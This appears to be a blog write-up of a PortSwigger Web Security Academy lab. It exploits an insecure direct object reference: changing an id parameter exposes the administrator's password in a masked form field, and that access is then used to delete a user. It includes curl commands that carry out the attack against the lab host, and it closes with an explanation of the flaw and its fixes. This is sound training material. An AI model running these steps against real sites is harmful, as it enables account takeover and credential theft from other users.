---
layout: post
title: "PortSwigger: User ID Controlled by Request Parameter, with Password Disclosure"
date: 2027-09-27 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, idor, horizontal-privilege-escalation, insecure-direct-object-reference, password-disclosure, information-disclosure, cwe-639]
---

This is the same username-keyed [IDOR](https://cwe.mitre.org/data/definitions/639.html) as the earlier labs — [CWE-639](https://cwe.mitre.org/data/definitions/639.html), authorization bypass through a user-controlled key — but the prize is bigger. Instead of leaking an API key, the vulnerable page leaks another user's **password**, and it hands it over in a field that *looks* hidden.

## Overview

You start with a normal account (`wiener:peter`). The goal is to gain administrator access and delete the user `carlos`.

## The tell

Log in and look at your own account page:

```
GET /my-account?id=wiener
```

The account is selected by the `id` parameter, and that's the entire access-control decision — the server trusts whatever `id` you send and never checks it against your session. The account page also includes an "Update password" form with your current password pre-filled into a masked input:

```html
<input required type=password name=password value='peter'/>
```

That `type=password` only hides the characters on screen. The real value is sitting in the page's HTML.

## The attack

Change `id` to `administrator` while still logged in as wiener:

```bash
U="https://<lab-id>.web-security-academy.net"

# 1. Log in as wiener:peter (CSRF token first)
csrf=$(curl -sk -c cookies.txt "$U/login" | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b cookies.txt -c cookies.txt "$U/login" \
  --data-urlencode "csrf=$csrf" \
  --data-urlencode "username=wiener" \
  --data-urlencode "password=peter"

# 2. IDOR: read the admin account page, grab the password from the value= attribute
curl -sk -b cookies.txt "$U/my-account?id=administrator" | grep -i password
```

The response contains the administrator's password verbatim:

```html
<input required type=password name=password value='vf3676kbf8ufb7yzgg14'/>
```

Now log back in as `administrator` with that password and delete carlos:

```bash
# 3. Re-login as administrator, then delete carlos
curl -sk -b cookies.txt "$U/admin/delete?username=carlos"   # 302 = done
```

The lab flips to **Solved**.

## Why it works

Two mistakes stack on top of each other:

1. **Missing authorization (CWE-639).** The page picks whose account to show from a client-supplied `id` instead of binding it to the logged-in session. Swap the value and you read anyone's account.
2. **Sensitive-data exposure.** A "masked" password box still ships the real password to the browser inside its `value` attribute. Masking is cosmetic — the secret is in the HTML for anyone who views source.

## The fix

- Derive the account to display from the **session**, never from a request parameter. Enforce a server-side ownership check on every object reference, deny by default.
- Never send a user's password back to the browser at all — not even into a masked field. Render password inputs empty.
